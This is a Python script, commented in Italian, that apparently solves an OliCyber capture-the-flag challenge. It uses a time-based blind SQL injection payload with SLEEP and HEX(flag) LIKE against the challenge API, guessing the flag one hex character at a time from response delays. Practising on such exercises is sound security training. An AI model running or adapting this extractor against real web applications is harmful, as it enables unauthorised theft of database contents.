#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
time_based_enum_olicyber.py

Enumerazione di una flag usando SQL Injection Time-Based
"""

import argparse
import time
import binascii
import sys
import requests
import json

# -----------------------
# Classe Inj fornita da olicyber
# -----------------------
class Inj:
    def __init__(self, host):
        self.sess = requests.Session()
        self.base_url = '{}/api/'.format(host.rstrip('/'))
        self._refresh_csrf_token()

    def _refresh_csrf_token(self):
        resp = self.sess.get(self.base_url + 'get_token')
        resp = resp.json()
        self.token = resp['token']

    def _do_raw_req(self, url, query):
        headers = {'X-CSRFToken': self.token}
        data = {'query': query }
        return self.sess.post(url,json=data, headers=headers).json()

    def logic(self, query):
        url = self.base_url + 'logic'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def union(self, query):
        url = self.base_url + 'union'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def blind(self, query):
        url = self.base_url + 'blind'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def time(self, query):
        url = self.base_url + 'time'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

# -----------------------
# Fine classe Inj
# -----------------------

def main():
    parser = argparse.ArgumentParser(description='Time-Based SQLi HEX enumerator (olicyber Inj class)')
    parser.add_argument('--host', required=True, help='Host base, es: http://web-17.challs.olicyber.it')
    parser.add_argument('--dictionary', default='0123456789abcdef', help='Caratteri da provare (default 0123456789abcdef)')
    parser.add_argument('--delay', type=float, default=0.05, help='Delay tra richieste (default 0.05s)')
    parser.add_argument('--max-len', type=int, default=512, help='Lunghezza massima HEX (default 512)')
    parser.add_argument('--verbose', action='store_true', help='Output dettagliato')
    parser.add_argument('--sleep-time', type=float, default=1.0, help='Secondi di SLEEP nella query per indicare match')
    args = parser.parse_args()

    inj = Inj(args.host)
    dictionary = args.dictionary.lower()
    result = ''

    # Payload time-based template
    payload_template = "1' AND (SELECT SLEEP({sleep}) FROM flags WHERE HEX(flag) LIKE '{}%')='1"

    print(f"[*] Inizio enumerazione Time-Based SQLi su {args.host}")
    print(f"[*] Dizionario: {dictionary}, Sleep: {args.sleep_time}s, max-len: {args.max_len}")

    try:
        while True:
            if len(result) >= args.max_len:
                print(f"[!] Raggiunta lunghezza massima ({args.max_len}). Termino.")
                break

            found_in_position = False
            for c in dictionary:
                guess = result + c
                payload = payload_template.format(guess, sleep=args.sleep_time)

                start = time.time()
                try:
                    inj.time(payload)
                except requests.RequestException as e:
                    print(f"[!] Errore di rete: {e}. Riprovando...")
                    continue
                elapsed = time.time() - start

                if args.verbose:
                    print(f"[v] Provo {guess} -> tempo: {elapsed:.2f}s")

                if elapsed >= args.sleep_time:
                    result += c
                    print(f"[+] Trovato: '{c}' -> current HEX: {result}")
                    found_in_position = True
                    break

                time.sleep(args.delay)

            if not found_in_position:
                print("[*] Nessun carattere trovato in questa posizione: fine enumerazione.")
                break

    except KeyboardInterrupt:
        print("\n[!] Interrotto dall'utente (CTRL-C)")

    print("----------------------------------------------------------------")
    if result:
        print(f"[+] HEX trovata: {result}")
        try:
            decoded = binascii.unhexlify(result).decode('utf-8', errors='replace')
            print(f"[+] Decodifica UTF-8: {decoded}")
        except (binascii.Error, ValueError) as e:
            print(f"[!] Impossibile decodificare hex: {e}")
    else:
        print("[!] Nessun risultato trovato.")

if __name__ == '__main__':
    main()
